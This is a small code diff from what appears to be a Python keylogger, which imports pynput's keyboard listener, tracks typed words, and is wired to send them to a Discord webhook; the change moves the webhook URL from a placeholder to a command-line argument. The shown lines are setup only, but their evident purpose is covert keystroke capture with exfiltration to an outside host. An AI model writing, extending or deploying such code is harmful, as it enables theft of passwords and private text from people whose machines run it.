@@ -2,8 +2,10 @@ from pynput.keyboard import Key, Listener
 import time
 import threading
 from discordwebhook import Discord
+import sys
 
-discord = Discord(url="Your webhook here")
+hook = sys.argv[1]
+discord = Discord(hook)
 
 word = []
 last_pressed = time.time()
